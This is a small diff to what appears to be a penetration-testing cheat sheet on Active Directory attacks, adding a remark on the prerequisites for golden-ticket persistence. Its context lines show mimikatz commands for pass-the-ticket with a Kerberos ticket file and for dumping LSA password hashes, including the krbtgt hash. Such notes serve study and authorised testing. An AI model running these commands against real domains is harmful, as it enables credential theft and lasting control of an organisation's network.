@@ -356,6 +356,7 @@ kerberos::ptt [0;3e7]-0-0-40a00000-ted@krbtgt-web01.exam.com-exam.com.kirbi (loa
 
 ### Persistence
 #### Golden Tickets(only if we can get password hash of a domain user account called krbtgt)
+>The golden ticket will require us to have access to a Domain Admin's group account or to have compromised the domain controller itself to work as a persistence method
 ```
 privilege::debug
 lsadump::lsa /patch(get password hash)
